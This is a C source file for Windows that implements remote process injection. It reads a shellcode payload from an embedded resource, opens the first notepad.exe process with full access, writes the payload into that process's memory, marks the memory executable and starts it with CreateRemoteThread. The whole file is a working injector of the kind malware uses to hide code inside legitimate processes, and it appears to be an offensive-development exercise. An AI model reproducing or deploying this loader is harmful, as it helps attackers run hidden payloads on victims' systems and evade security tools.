#include <windows.h>
#include <TlHelp32.h>
#include <string.h>
#include <stdio.h>
#include "resource.h"

int getResoucePayload(OUT PVOID* ppPayloadAddress, OUT SIZE_T* psPayloadSize) {
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;

	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		return -1;
	}

	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		return -1;
	}

	*ppPayloadAddress = LockResource(hGlobal);
	if (*ppPayloadAddress == NULL) {
		return -1;
	}

	*psPayloadSize = SizeofResource(NULL, hRsrc);
	if (*psPayloadSize == NULL) {
		return -1;
	}

	return 0;

}

int getRemoteProcessHandle(OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {
	// TODO: desired injection process as parameter instead of hardcoded notepad


	// Get process listing snapshot
	HANDLE hSnapShot = NULL;
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == NULL) {
		printf("[!] Error getting process list snapshot \n");
		return -1;
	}

	// Must initialize dwSize according to docs
	PROCESSENTRY32 ProcList = {
		.dwSize = sizeof(PROCESSENTRY32)
	};
	if (!Process32First(hSnapShot, &ProcList)) {
		printf("[!] Error getting process details \n");
		return -1;
	}

	// Look for first instance of notepad.exe
	WCHAR szProcessName[] = L"notepad.exe";
	do {
		if (_wcsicmp(ProcList.szExeFile, szProcessName) == 0) {
			*dwProcessId = ProcList.th32ProcessID;
			printf("[i] Got Process Name %ls and PID %d \n", ProcList.szExeFile, *dwProcessId);
			break;
		}
	} while (Process32Next(hSnapShot, &ProcList));

	// Get handle
	*hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, *dwProcessId);
	if (*hProcess == NULL) {
		printf("[!] Error getting process handle from PID %u \n", *dwProcessId);
		return -1;
	}

	return 0;

}

int main() {
	// TODO: Move injection to a function

	// Get payload from resource file
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;

	if (getResoucePayload(&pPayloadAddress, &sPayloadSize)) {
		printf("[!] Error getting payload \n");
		return -1;
	}


	// Get handle to remote process (notepad)
	DWORD		ProcessId = NULL;
	HANDLE		hProcess = NULL;

	if (getRemoteProcessHandle(&ProcessId, &hProcess)) {
		printf("[!] Can't continue! No remote process handle \n");
		return -1;
	}

	// Inject
	PVOID		pRemotePayload = NULL;
	pRemotePayload = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pRemotePayload == NULL) {
		printf("[!] Error with VirtualAllocEx \n");
		return -1;
	}

	if (!WriteProcessMemory(hProcess, pRemotePayload, pPayloadAddress, sPayloadSize, NULL)) {
		printf("[!] Error writing process memory \n");
		return -1;
	}

	DWORD flOldProtect = NULL;
	if (!VirtualProtectEx(hProcess, pRemotePayload, sPayloadSize, PAGE_EXECUTE_READWRITE, &flOldProtect)) {
		printf("[!] Error changing page protection \n");
		return -1;
	}

	HANDLE		hRemoteThread = NULL;
	DWORD		ThreadId = NULL;
	hRemoteThread = CreateRemoteThread(hProcess, NULL, NULL, pRemotePayload, NULL, NULL, &ThreadId);
	if (hRemoteThread == NULL) {
		printf("[!] Error starting remote thread \n");
		return -1;
	}
	WaitForSingleObjectEx(hRemoteThread, 2000, FALSE);

	// Polite to free the memory
	if (!VirtualFreeEx(hProcess, pRemotePayload, 0, MEM_RELEASE)) {
		printf("[!] Error freeing remote process memory");
	}
	
	printf("[*] Remote thread started! \n");
	printf("[i] Press Enter to quit...");
	getchar();
	return 0;

}

